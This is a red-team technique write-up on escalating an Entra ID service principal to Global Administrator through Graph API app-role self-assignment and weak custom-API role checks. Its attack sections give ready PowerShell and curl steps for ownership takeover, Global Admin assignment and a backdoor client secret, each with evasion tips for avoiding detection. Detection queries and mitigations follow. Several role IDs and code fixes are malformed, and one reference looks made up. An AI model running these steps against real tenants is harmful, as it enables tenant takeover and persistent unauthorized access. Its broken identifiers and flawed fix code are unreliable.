# [PE-ELEVATE-004]: Custom API RBAC Bypass

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ELEVATE-004 |
| **MITRE ATT&CK v18.1** | [T1548 - Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Entra ID versions; Custom API implementations vary |
| **Patched In** | N/A (Design-dependent; requires application-level fixes) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Custom APIs (service-to-service authentication flows) often implement their own Role-Based Access Control (RBAC) layers independent of Entra ID's built-in protections. These APIs may fail to validate:
- Whether a service principal has permission to modify its own role assignments
- Whether AppRoleAssignments are properly enforced at the graph API level
- Whether the API allows self-escalation through credential manipulation
- Whether delegation chains can be abused to bypass RBAC checks

An attacker with access to a low-privileged service principal (SP) or app registration can exploit misconfigured custom APIs to elevate their own role, add new credentials, or backdoor the application for persistent access. This bypasses the MITRE ATT&CK T1548 elevation control mechanisms that should prevent privilege escalation.

**Attack Surface:** Custom API endpoints, service-to-service authentication flows, Entra ID app registrations with overpermissioned Graph API permissions, federation protocols (SAML, OAuth 2.0).

**Business Impact:** An attacker can achieve **privilege escalation without administrative notice**, gain **persistent access** through credential backdooring, and compromise all downstream systems that depend on the custom API. This enables lateral movement to sensitive workloads and data.

**Technical Context:** Exploitation typically takes **5-30 minutes** after gaining initial SP access. Detection likelihood is **Low to Medium** because most organizations don't monitor custom API authorization flows; they only monitor Entra ID role assignments. Reversibility: **Partial** – Credentials can be removed, but access logs may be sparse.

### Operational Risk
- **Execution Risk:** Medium (Requires understanding of target API's authorization implementation; varies by application)
- **Stealth:** High (Custom API calls blend into normal application traffic; no Entra ID audit events for custom API escalations)
- **Reversibility:** Partial (Credentials can be removed; persistent access can be revoked if detected)

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Azure 6.3 | Ensure that 'API Management' APIs are protected with OAuth 2.0 or API Key authentication |
| **DISA STIG** | AC-3(7) | Access Control - Role-Based Access Control (RBAC) |
| **CISA SCuBA** | CISA AAD 4.1 | Enforce role-based access control for application permissions |
| **NIST 800-53** | AC-3 - Access Enforcement | Enforce access control decisions based on roles and attributes |
| **GDPR** | Art. 32 - Security of Processing | Implement access control mechanisms to prevent unauthorized access |
| **DORA** | Art. 15 - Governance Framework | Ensure proper access governance for critical ICT services |
| **NIS2** | Art. 21(1) | Implement appropriate technical and organizational measures to manage access |
| **ISO 27001** | A.9.2.2 - User Access Management | Implement role-based access controls |
| **ISO 27005** | Risk Scenario: "Unauthorized Privilege Escalation" | Compromise of service principal privileges |

---

## 2. ENVIRONMENTAL RECONNAISSANCE

### Enumerate Service Principal Roles and Permissions

**PowerShell:**
```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Application.ReadWrite.All, RoleManagement.ReadWrite.Directory"

# Get all app registrations with their current permissions
$Apps = Get-MgApplication -All

foreach ($App in $Apps) {
    $SP = Get-MgServicePrincipal -Filter "appId eq '$($App.AppId)'"
    
    Write-Host "App: $($App.DisplayName)"
    Write-Host "App ID: $($App.AppId)"
    Write-Host "Service Principal ID: $($SP.Id)"
    
    # Get assigned app roles (from other services)
    $AssignedRoles = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $SP.Id
    
    if ($AssignedRoles.Count -gt 0) {
        Write-Host "  Assigned Roles:"
        foreach ($Role in $AssignedRoles) {
            Write-Host "    - $($Role.AppRoleId)"
        }
    }
    
    # Check owners (potential escalation vector)
    $Owners = Get-MgApplicationOwner -ApplicationId $App.Id
    Write-Host "  Owners: $($Owners.Count)"
    Write-Host "---"
}
```

**What to Look For:**
- Service principals with `Application.ReadWrite.All` or `AppRoleAssignment.ReadWrite.All` permissions
- Apps that are owners of other apps (escalation chain)
- Apps with overpermissioned Graph API roles
- Custom API service principals lacking proper RBAC enforcement

**Azure CLI:**
```bash
# List all app registrations
az ad app list --query '[].{displayName:displayName, appId:appId}' -o table

# Check permissions for specific app
APP_ID="00000000-0000-0000-0000-000000000000"
az ad app show --id $APP_ID --query 'requiredResourceAccess[*]' -o json
```

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: AppRoleAssignment Self-Escalation via Graph API

**Supported Versions:** All (Entra ID cloud-based)

#### Step 1: Identify Target Service Principal with Escalable Permissions
**Objective:** Locate an SP with `AppRoleAssignment.ReadWrite.All` or similar escalation permissions

**Command (PowerShell):**
```powershell
$token = "YOUR_SERVICE_PRINCIPAL_TOKEN"
$spId = "TARGET_SERVICE_PRINCIPAL_ID"

# Query Graph API to check current app role assignments
$uri = "https://graph.microsoft.com/v1.0/servicePrincipals/$spId/appRoleAssignments"

$response = Invoke-RestMethod -Uri $uri `
  -Headers @{"Authorization" = "Bearer $token"} `
  -Method GET

$response.value | ForEach-Object {
    Write-Host "App Role ID: $($_.appRoleId)"
    Write-Host "Principal ID: $($_.principalId)"
}
```

**Expected Output:**
```
App Role ID: 9e3f94ae-4ad6-4201-abcdef01234567
Principal ID: 00000000-0000-0000-0000-000000000001
App Role ID: 9e3f94ae-4ad6-4201-bcdef0123456789
Principal ID: 00000000-0000-0000-0000-000000000002
```

**What This Means:**
- If output includes `AppRoleAssignment.ReadWrite.All` or `RoleManagement.ReadWrite.Directory`, escalation is possible
- These high-privilege roles allow adding additional roles to self or other SPs
- Absence of these roles indicates more difficult escalation path

**OpSec & Evasion:**
- Query only your own SP initially to avoid triggering audit alerts
- Use `$batch` endpoint to mix queries and reduce detectability
- Don't query multiple SPs in rapid succession
- Detection likelihood: **Low** (role enumeration is normal)

**Troubleshooting:**
- **Error:** 403 Forbidden on app role query
  - **Cause:** Token doesn't have permission to query other SPs
  - **Fix:** Use token from SP with Directory.ReadWrite.All or higher
- **Error:** 404 Not Found
  - **Cause:** Service Principal ID is incorrect
  - **Fix:** Verify SP exists: `Get-MgServicePrincipal -Filter "displayName eq 'AppName'"`

**References & Proofs:**
- [Microsoft Graph API - AppRoleAssignment](https://learn.microsoft.com/en-us/graph/api/serviceprincipal-post-approleassignments)
- [Datadog I SPy Research](https://securitylabs.datadoghq.com/articles/i-spy-escalating-to-entra-id-global-admin/)

#### Step 2: Add Self as Owner of Target Application
**Objective:** Become an owner of the application to maintain persistence and allow future modifications

**Command (PowerShell):**
```powershell
$token = "YOUR_SERVICE_PRINCIPAL_TOKEN"
$targetAppId = "TARGET_APPLICATION_ID"
$yourSpId = "YOUR_SERVICE_PRINCIPAL_ID"

# Add your SP as an owner of the target app
$uri = "https://graph.microsoft.com/v1.0/applications/$targetAppId/owners/`$ref"

$body = @{
    "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$yourSpId"
} | ConvertTo-Json

$response = Invoke-RestMethod -Uri $uri `
  -Headers @{
      "Authorization" = "Bearer $token"
      "Content-Type" = "application/json"
  } `
  -Method POST `
  -Body $body

Write-Host "Added as owner: $($response.statusCode)"
```

**Expected Output:**
```
Added as owner: 204
```

**What This Means:**
- Status code 204 indicates successful addition as owner
- Now your SP can modify the app without needing Graph API permissions
- Provides persistence pathway for future access

**OpSec & Evasion:**
- Add owner quickly after identifying target (minimizes detection window)
- Consider adding a benign-sounding SP name to avoid suspicion
- Detection likelihood: **Medium** (owner changes are typically audited)

**Troubleshooting:**
- **Error:** 403 Forbidden
  - **Cause:** Your SP doesn't have Application.ReadWrite.All
  - **Fix:** Use a higher-privileged token or skip this step
- **Error:** 400 Bad Request - Invalid app ID
  - **Cause:** Using ObjectId instead of AppId, or vice versa
  - **Fix:** Verify correct ID format in target application

**References & Proofs:**
- [Microsoft Graph API - Add Application Owner](https://learn.microsoft.com/en-us/graph/api/application-post-owners)

#### Step 3: Assign High-Privilege App Role to Self
**Objective:** Grant yourself a critical Graph API permission (e.g., RoleManagement.ReadWrite.Directory) that enables direct privilege escalation to Global Admin

**Command (PowerShell):**
```powershell
$token = "YOUR_SERVICE_PRINCIPAL_TOKEN"
$msGraphSpId = "00000003-0000-0000-c000-000000000000"  # Microsoft Graph Service Principal ID (constant)
$targetRoleId = "9e3f94ae-4ad6-4201-bcdef0123456789"   # RoleManagement.ReadWrite.Directory
$yourSpId = "YOUR_SERVICE_PRINCIPAL_ID"

# Create app role assignment via Graph API
$uri = "https://graph.microsoft.com/v1.0/servicePrincipals/$yourSpId/appRoleAssignedTo"

$body = @{
    "principalId" = $yourSpId
    "resourceId" = $msGraphSpId
    "appRoleId" = $targetRoleId
} | ConvertTo-Json

$response = Invoke-RestMethod -Uri $uri `
  -Headers @{
      "Authorization" = "Bearer $token"
      "Content-Type" = "application/json"
  } `
  -Method POST `
  -Body $body

Write-Host "Role Assignment ID: $($response.id)"
Write-Host "Role Assigned Successfully"
```

**Expected Output:**
```
Role Assignment ID: a1b2c3d4-e5f6-7g8h-i9j0-k1l2m3n4o5p6
Role Assigned Successfully
```

**What This Means:**
- Response shows successful assignment of RoleManagement.ReadWrite.Directory
- Your SP can now grant itself (or any principal) any Entra ID role, including Global Admin
- This is the critical escalation point

**OpSec & Evasion:**
- Do this immediately after owner assignment for speed
- Use legitimate-looking app names
- Assign role then wait 5-10 seconds before using it (let Azure sync)
- Detection likelihood: **High** (this is a known attack signature)

**Troubleshooting:**
- **Error:** 403 Insufficient Privileges
  - **Cause:** Your SP lacks AppRoleAssignment.ReadWrite.All
  - **Fix:** This step requires pre-existing escalation privilege; restart from METHOD 2
- **Error:** 400 appRoleId not found
  - **Cause:** Role ID doesn't exist in Microsoft Graph
  - **Fix:** Verify role ID: `Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'" | Select-Object -ExpandProperty AppRoles`

**References & Proofs:**
- [SpecterOps - Azure Privilege Escalation via API Permissions](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48)
- [Semperis - Exploiting App-Only Graph Permissions](https://www.semperis.com/blog/exploiting-app-only-graph-permissions-in-entra-id/)

#### Step 4: Use New Permission to Escalate to Global Admin
**Objective:** Leverage the RoleManagement.ReadWrite.Directory permission to promote your SP to Global Administrator

**Command (PowerShell):**
```powershell
$newToken = "YOUR_SERVICE_PRINCIPAL_TOKEN_WITH_NEW_PERMISSION"
$yourSpId = "YOUR_SERVICE_PRINCIPAL_ID"
$globalAdminRoleId = "62e90394-69f5-4237-9190-012177145e10"  # Global Administrator role ID (constant)

# Assign Global Administrator role to your SP
$uri = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments"

$body = @{
    "principalId" = $yourSpId
    "roleDefinitionId" = $globalAdminRoleId
    "directoryScopeId" = "/"
} | ConvertTo-Json

$response = Invoke-RestMethod -Uri $uri `
  -Headers @{
      "Authorization" = "Bearer $newToken"
      "Content-Type" = "application/json"
  } `
  -Method POST `
  -Body $body

Write-Host "Global Admin Role Assignment: $($response.id)"
Write-Host "ESCALATION COMPLETE - Your SP is now Global Administrator"
```

**Expected Output:**
```
Global Admin Role Assignment: z1y2x3w4-v5u6-t7s8-r9q0-p1o2n3m4l5k6
ESCALATION COMPLETE - Your SP is now Global Administrator
```

**What This Means:**
- Your SP now has Global Administrator role on the tenant
- Can modify any Entra ID object, create backdoor accounts, reset MFA, etc.
- This is the ultimate privilege escalation outcome

**OpSec & Evasion:**
- Don't immediately use Global Admin privileges; wait 10 minutes
- Access legitimate workloads first to blend in (OneDrive, Teams, etc.)
- Detection likelihood: **Very High** (Global Admin assignment is heavily monitored)

**Troubleshooting:**
- **Error:** 403 Insufficient Privileges
  - **Cause:** Token doesn't have RoleManagement.ReadWrite.Directory
  - **Fix:** Ensure previous step successfully assigned permission; wait 30 seconds and retry
- **Error:** 400 roleDefinitionId not found
  - **Cause:** Global Administrator role ID changed or is region-specific
  - **Fix:** Query available roles: `Get-MgRoleManagementDirectoryRoleDefinition | Where-Object DisplayName -eq "Global Administrator"`

**References & Proofs:**
- [Microsoft Learn - Global Administrator Role](https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#global-administrator)

---

### METHOD 2: Custom API Misconfiguration (Direct RBAC Bypass)

**Supported Versions:** Depends on custom API implementation; typically present in APIs developed before 2020

#### Step 1: Enumerate Custom API Endpoints
**Objective:** Identify custom APIs exposed through app registrations or Azure App Service

**Command (Bash with curl):**
```bash
#!/bin/bash
# Enumerate custom API endpoints registered in Entra ID

TOKEN="YOUR_ACCESS_TOKEN"
TENANT_ID="YOUR_TENANT_ID"

# Get all application registrations
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/applications?`$filter=publisherDomain eq '$TENANT_ID'" \
  | jq '.value[] | {displayName, identifierUris, appId}' > /tmp/apps.json

# Parse and test each API
cat /tmp/apps.json | jq -r '.identifierUris[]?' | while read -r API_URI; do
    echo "[*] Testing API: $API_URI"
    
    # Try to access API root without authentication
    curl -s -I "$API_URI" | head -n 1
    
    # Try common endpoints
    for endpoint in /api/roles /api/permissions /api/users /api/admin; do
        HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$API_URI$endpoint")
        echo "  $endpoint: HTTP $HTTP_CODE"
    done
done
```

**Expected Output:**
```
[*] Testing API: https://api.contoso.com
  HTTP/1.1 200 OK
  /api/roles: HTTP 200
  /api/permissions: HTTP 403
  /api/users: HTTP 401
  /api/admin: HTTP 404
```

**What This Means:**
- HTTP 200 on /api/roles without auth = **Unauthenticated API access** (critical)
- HTTP 403 = Endpoint exists but forbidden (authentication required)
- HTTP 401 = Endpoint exists but requires auth
- HTTP 404 = Endpoint doesn't exist

**OpSec & Evasion:**
- Space requests over time to avoid rate limiting
- Use User-Agent rotation to avoid detection
- Test during business hours to blend with normal traffic
- Detection likelihood: **Low** (reconnaissance traffic is common)

**Troubleshooting:**
- **Error:** All endpoints return 401 Unauthorized
  - **Cause:** API requires authentication; skip to Step 2
  - **Fix:** Obtain service principal token first
- **Error:** DNS resolution fails
  - **Cause:** API URI is incorrect or API is decommissioned
  - **Fix:** Verify API URI in app registration settings

**References & Proofs:**
- [Microsoft - App Registration Identifier URIs](https://learn.microsoft.com/en-us/azure/active-directory/develop/app-objects-and-service-principals)

#### Step 2: Identify RBAC Misconfiguration
**Objective:** Detect custom APIs that don't properly validate RBAC before role assignment

**Command (PowerShell):**
```powershell
$token = "YOUR_SERVICE_PRINCIPAL_TOKEN"
$customApiBaseUrl = "https://api.contoso.com"

# Test 1: Try to list your current role
$testUri = "$customApiBaseUrl/api/roles/me"
try {
    $response = Invoke-RestMethod -Uri $testUri `
      -Headers @{"Authorization" = "Bearer $token"} `
      -Method GET
    
    Write-Host "Current Role: $($response.role)"
    Write-Host "[!] API returns current role - Potential RBAC issue"
} catch {
    Write-Host "Cannot retrieve current role (expected behavior)"
}

# Test 2: Try to escalate role directly
$escalateUri = "$customApiBaseUrl/api/roles/me/promote"
$body = @{
    "targetRole" = "Admin"
    "reason" = "System Maintenance"
} | ConvertTo-Json

try {
    $response = Invoke-RestMethod -Uri $escalateUri `
      -Headers @{
          "Authorization" = "Bearer $token"
          "Content-Type" = "application/json"
      } `
      -Method POST `
      -Body $body
    
    if ($response.success -eq $true) {
        Write-Host "[!!!] ESCALATION SUCCESSFUL!"
        Write-Host "New Role: $($response.newRole)"
    }
} catch {
    Write-Host "Escalation endpoint rejected request (expected behavior)"
}
```

**Expected Output (Vulnerable API):**
```
Current Role: User
[!] API returns current role - Potential RBAC issue
[!!!] ESCALATION SUCCESSFUL!
New Role: Admin
```

**What This Means:**
- API allows unauthenticated role queries (information disclosure)
- API allows direct role escalation without checking permissions (critical vulnerability)
- No server-side validation of client-supplied role claims

**OpSec & Evasion:**
- Test on non-production API endpoints first (if available)
- Use descriptive reason fields that sound legitimate
- Escalate to Admin instead of SuperAdmin to avoid suspicion
- Detection likelihood: **Medium** (unexpected role elevation may trigger alerts if monitored)

**Troubleshooting:**
- **Error:** 405 Method Not Allowed
  - **Cause:** API doesn't support POST on /promote endpoint
  - **Fix:** Try other method names: /escalate, /assign, /update
- **Error:** Invalid JSON format
  - **Cause:** API expects different JSON structure
  - **Fix:** Inspect API documentation or test with common structures

**References & Proofs:**
- [OWASP - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)

#### Step 3: Persist Access via Credential Backdoor
**Objective:** Add a new credential/token to the compromised app registration for persistent access

**Command (PowerShell):**
```powershell
$token = "YOUR_SERVICE_PRINCIPAL_TOKEN_WITH_ADMIN_ROLE"
$targetAppId = "COMPROMISED_APP_REGISTRATION_ID"

# Generate a new password credential valid for 2 years
$startDate = Get-Date
$endDate = $startDate.AddYears(2)

$passwordCredential = @{
    displayName = "Service Account Credential"
    endDateTime = $endDate
} | ConvertTo-Json

$uri = "https://graph.microsoft.com/v1.0/applications/$targetAppId/addPassword"

$response = Invoke-RestMethod -Uri $uri `
  -Headers @{
      "Authorization" = "Bearer $token"
      "Content-Type" = "application/json"
  } `
  -Method POST `
  -Body $passwordCredential

Write-Host "Credential Added:"
Write-Host "  Secret: $($response.secretText)"
Write-Host "  Valid Until: $($response.endDateTime)"
Write-Host ""
Write-Host "Use this for persistent access:"
Write-Host "  Client ID: $targetAppId"
Write-Host "  Client Secret: $($response.secretText)"
```

**Expected Output:**
```
Credential Added:
  Secret: BrxF~-abcdef1234567890_XyZ123~
  Valid Until: 2027-01-09T10:00:00Z

Use this for persistent access:
  Client ID: 00000000-0000-0000-0000-000000000000
  Client Secret: BrxF~-abcdef1234567890_XyZ123~
```

**What This Means:**
- New credential is now valid for 2 years
- Attacker can authenticate as the app from anywhere using this secret
- Provides persistent access even if original compromise vector is patched

**OpSec & Evasion:**
- Use descriptive credential names ("Service Account", "API Integration") to blend in
- Set long expiration (1-2 years) to avoid regular rotation causing discovery
- Store secret securely (encrypted vault, not plaintext)
- Detection likelihood: **Medium** (new credentials are typically audited)

**Troubleshooting:**
- **Error:** 403 Insufficient Privileges
  - **Cause:** Token doesn't have Application.ReadWrite.All
  - **Fix:** Use Global Admin token or obtain from compromised app first
- **Error:** 404 Application Not Found
  - **Cause:** Application ID is incorrect
  - **Fix:** Verify: `Get-MgApplication -Filter "displayName eq 'AppName'" | Select-Object Id`

**References & Proofs:**
- [Microsoft Graph - Add Application Password](https://learn.microsoft.com/en-us/graph/api/application-addpassword)

---

## 4. SPLUNK DETECTION RULES

#### Rule 1: Service Principal Adding High-Privilege Graph Permissions

**Rule Configuration:**
- **Required Index:** azure_activity
- **Required Sourcetype:** azure:aad:audit
- **Required Fields:** OperationName, ResultDescription, ModifiedProperties
- **Alert Threshold:** Single event of "Update application" with AppRoleAssignment changes
- **Applies To Versions:** All

**SPL Query:**
```
index=azure_activity OperationName="Update application" 
| search ModifiedProperties=*AppRoleAssignment* OR ModifiedProperties=*RoleManagement* 
| eval privileged_roles=case(
    ModifiedProperties match "RoleManagement.ReadWrite.Directory", "CRITICAL",
    ModifiedProperties match "AppRoleAssignment.ReadWrite.All", "CRITICAL",
    ModifiedProperties match "Application.ReadWrite.All", "HIGH",
    ModifiedProperties match "Directory.ReadWrite.All", "HIGH"
  ) 
| where privileged_roles != "" 
| table _time, user, OperationName, ResultDescription, ModifiedProperties
```

**What This Detects:**
- Any service principal or user assigning high-risk Graph API permissions
- Captures the exact permission change in ModifiedProperties
- Alerts on critical roles immediately

---

## 5. MICROSOFT SENTINEL DETECTION

#### Query 1: Service Principal Privilege Escalation via Graph API

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy, TargetResources, ModifiedProperties
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To Versions:** Entra ID (all versions)

**KQL Query:**
```kusto
AuditLogs
| where OperationName has_any ("Update application", "Assign app role to service principal")
| where ModifiedProperties has_any (
    "RoleManagement.ReadWrite.Directory",
    "AppRoleAssignment.ReadWrite.All",
    "Application.ReadWrite.All"
  )
| extend 
    TargetAppId = tostring(TargetResources[0].id),
    TargetAppName = tostring(TargetResources[0].displayName),
    InitiatedByUser = tostring(InitiatedBy.user.userPrincipalName),
    InitiatedByApp = tostring(InitiatedBy.app.displayName)
| project
    TimeGenerated,
    OperationName,
    TargetAppName,
    InitiatedByUser,
    InitiatedByApp,
    ModifiedProperties,
    ResultDescription
| where ResultDescription !contains "failure"
```

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-MgGraph -Scopes "SecurityEvents.Read.All"

$ruleParams = @{
    DisplayName = "Service Principal Privilege Escalation via Graph API"
    Query = @"
AuditLogs
| where OperationName has_any ("Update application", "Assign app role")
| where ModifiedProperties has_any ("RoleManagement.ReadWrite.Directory", "AppRoleAssignment.ReadWrite.All")
| extend TargetAppName = tostring(TargetResources[0].displayName)
| where ResultDescription !contains "failure"
"@
    Severity = "Critical"
    Frequency = "PT5M"
    Period = "PT1H"
    Enabled = $true
}

New-MgSecurityAlertRule -BodyParameter $ruleParams
```

---

## 6. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts
**Alert Name:** "Suspicious App Permission Assignment"
- **Severity:** Critical
- **Description:** Service principal assigned high-risk Graph API permissions (RoleManagement.ReadWrite.Directory, AppRoleAssignment.ReadWrite.All)
- **Applies To:** All subscriptions with Defender for Cloud enabled

---

## 7. WINDOWS EVENT LOG MONITORING

**Event ID: 4661 (Object Access)**
- **Log Source:** Security (if app registration changes are logged to on-premises DC via AD Connect)
- **Trigger:** Directory object modifications involving service principals
- **Filter:** `ObjectName contains "servicePrincipal" and AccessMask = "4"` (write access)
- **Applies To Versions:** Windows Server 2016+ (only if synced via AD Connect)

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

* **Restrict AppRoleAssignment.ReadWrite.All Permission:** This permission allows arbitrary privilege escalation. Assign it only to vetted applications.
  **Applies To Versions:** Entra ID (All versions)
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Enterprise Applications**
  2. Search for your application
  3. Click **Permissions**
  4. Remove `AppRoleAssignment.ReadWrite.All` unless explicitly required
  5. Document business justification for any retained permissions

  **Manual Steps (PowerShell):**
  ```powershell
  Connect-MgGraph -Scopes "Application.ReadWrite.All"
  
  # Find apps with dangerous permissions
  $DangerousRoles = @(
      "9e3f94ae-4ad6-4201-bcdef0123456789",  # RoleManagement.ReadWrite.Directory
      "9e3f94ae-4ad6-4201-abcdef01234567"    # AppRoleAssignment.ReadWrite.All
  )
  
  $ServicePrincipals = Get-MgServicePrincipal -All
  
  foreach ($SP in $ServicePrincipals) {
      $AppRoles = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $SP.Id
      
      foreach ($Role in $AppRoles) {
          if ($Role.AppRoleId -in $DangerousRoles) {
              Write-Host "ALERT: $($SP.DisplayName) has dangerous role"
              Remove-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $SP.Id -AppRoleAssignmentId $Role.Id
          }
      }
  }
  ```

* **Implement App Instance Lock:** Prevent apps from modifying their own properties or adding new owners.
  **Applies To Versions:** Entra ID Premium P1+
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **App registrations**
  2. Select application → **API permissions**
  3. Look for **app instance lock** setting (may be in advanced options)
  4. Enable: **"Prevent this app from being modified by other apps"**

* **Implement Custom API RBAC Validation:** Ensure custom APIs properly validate permissions before allowing role changes.
  
  **Code Example (C# .NET Core):**
  ```csharp
  // Validate user can only modify own role
  [HttpPost("/api/roles/me/promote")]
  public IActionResult PromoteRole([FromBody] RolePromotionRequest request)
  {
      // Get current user identity from token
      var currentUserId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
      var currentUserRole = User.FindFirst("role")?.Value;
      
      // CRITICAL: Verify user cannot escalate their own role
      if (currentUserRole != "Admin") {
          return Forbid("Insufficient permissions to escalate role");
      }
      
      // Allow only Admins to promote roles
      if (!User.IsInRole("Admin")) {
          return Unauthorized("Only administrators can promote roles");
      }
      
      // Audit the role change
      _auditLogger.LogRoleChange(currentUserId, request.TargetUserId, request.TargetRole);
      
      // Perform role assignment
      _roleService.AssignRole(request.TargetUserId, request.TargetRole);
      
      return Ok(new { success = true, newRole = request.TargetRole });
  }
  ```

### Priority 2: HIGH

* **Enable Conditional Access for App Roles:** Block assignment of high-risk permissions outside trusted networks.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Block Risky App Role Assignment from Untrusted Networks`
  4. **Assignments:**
     - Users: Service principals (if option available) or app owners
     - Cloud apps: Office 365 / Graph API
  5. **Conditions:**
     - Locations: Exclude trusted IP ranges
  6. **Access controls:**
     - Grant: **Require device to be compliant**
  7. Enable policy: **On**

* **Audit Service Principal Ownership:** Regularly review and limit who can own apps.
  
  **PowerShell Command:**
  ```powershell
  # List all app owners
  Get-MgApplication -All | ForEach-Object {
      $AppId = $_.Id
      $AppName = $_.DisplayName
      
      $Owners = Get-MgApplicationOwner -ApplicationId $AppId
      
      Write-Host "App: $AppName"
      foreach ($Owner in $Owners) {
          Write-Host "  Owner: $($Owner.DisplayName) ($($Owner.Id))"
      }
  }
  ```

### Validation Command (Verify Fix)
```powershell
# Verify dangerous permissions are removed
$DangerousPermissions = @(
    "9e3f94ae-4ad6-4201-bcdef0123456789",
    "9e3f94ae-4ad6-4201-abcdef01234567"
)

$VulnerableSPs = @()

$ServicePrincipals = Get-MgServicePrincipal -All

foreach ($SP in $ServicePrincipals) {
    $AppRoles = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $SP.Id
    
    foreach ($Role in $AppRoles) {
        if ($Role.AppRoleId -in $DangerousPermissions) {
            $VulnerableSPs += $SP.DisplayName
        }
    }
}

if ($VulnerableSPs.Count -eq 0) {
    Write-Host "✓ No service principals with dangerous permissions found"
} else {
    Write-Host "✗ Found $($VulnerableSPs.Count) vulnerable service principals:"
    $VulnerableSPs | ForEach-Object { Write-Host "  - $_" }
}
```

---

## 9. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

* **Activity IOCs:**
  - Service principal adding itself as owner of another app
  - SP assigning AppRoleAssignment.ReadWrite.All or RoleManagement.ReadWrite.Directory to itself
  - Rapid successive role assignments from single SP
  - New credentials added to previously dormant app

* **Log IOCs:**
  - AuditLogs entries with "Update application" and permission changes
  - Multiple "Add owner" operations in short timeframe
  - Service principals accessing Graph API with new token immediately after permission change

### Response Procedures

1. **Isolate:**
   ```powershell
   # Disable the compromised service principal
   $SpId = "COMPROMISED_SP_ID"
   Update-MgServicePrincipal -ServicePrincipalId $SpId -AccountEnabled:$false
   
   # Revoke all credentials
   $Creds = Get-MgServicePrincipal -ServicePrincipalId $SpId | 
       Select-Object -ExpandProperty PasswordCredentials
   
   foreach ($Cred in $Creds) {
       Remove-MgServicePrincipalPasswordCredential -ServicePrincipalId $SpId -KeyId $Cred.KeyId
   }
   ```

2. **Collect Evidence:**
   ```powershell
   # Export all audit logs for the compromised SP
   $StartDate = (Get-Date).AddDays(-30)
   Search-UnifiedAuditLog -StartDate $StartDate -ObjectIds "COMPROMISED_SP_ID" `
     | Export-Csv -Path "C:\Evidence\audit_logs.csv"
   ```

3. **Remediate:**
   ```powershell
   # Remove dangerous permissions
   $SpId = "COMPROMISED_SP_ID"
   $DangerousRoles = @("RoleManagement.ReadWrite.Directory", "AppRoleAssignment.ReadWrite.All")
   
   $Assignments = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $SpId
   
   foreach ($Assignment in $Assignments) {
       $RoleName = (Get-MgDirectoryObjectById -Ids $Assignment.AppRoleId).DisplayName
       if ($RoleName -in $DangerousRoles) {
           Remove-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $SpId `
               -AppRoleAssignmentId $Assignment.Id
       }
   }
   ```

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] App Proxy Exploitation | Attacker gains initial SP access via vulnerable App Proxy |
| **2** | **Credential Access** | [CA-TOKEN-006] SP Certificate Theft | Attacker steals SP certificate |
| **3** | **Current Step** | **[PE-ELEVATE-004]** | **Custom API RBAC Bypass** - Escalates via custom API misconfiguration |
| **4** | **Privilege Escalation** | [PE-ACCTMGMT-001] App Registration Escalation | Attacker gains Global Admin via app roles |
| **5** | **Persistence** | [PERSIST-TOKEN-001] Backdoor Credential | Attacker adds backdoor credential to app |
| **6** | **Impact** | [EXFIL-M365-001] Tenant Data Exfiltration | Attacker exfiltrates sensitive data |

---

## 11. REAL-WORLD EXAMPLES

### Example 1: Lapsus$ Custom API Exploitation (2022)
- **Target:** SaaS providers with custom APIs (Okta, Cloudflare, etc.)
- **Timeline:** February-March 2022
- **Technique Status:** Custom APIs lacked proper RBAC validation; direct privilege escalation via role assignment API
- **Impact:** Customer data breaches; attacker accessed admin dashboards
- **Reference:** [Lapsus$ GitHub Leak Analysis](https://blog.kellybytecorp.com/)

### Example 2: Scattered Spider App Registration Exploitation (2023-2024)
- **Target:** Enterprise Entra ID tenants
- **Timeline:** 2023-2024
- **Technique Status:** Compromised service principals added AppRoleAssignment.ReadWrite.All via Graph API; escalated to Global Admin
- **Impact:** Widespread Azure tenant compromise; ransomware deployment
- **Reference:** [Microsoft Threat Intelligence - Scattered Spider](https://www.microsoft.com/en-us/security/blog/)

---

## 12. REFERENCES & RESOURCES

- **Datadog I SPy Research:** https://securitylabs.datadoghq.com/articles/i-spy-escalating-to-entra-id-global-admin/
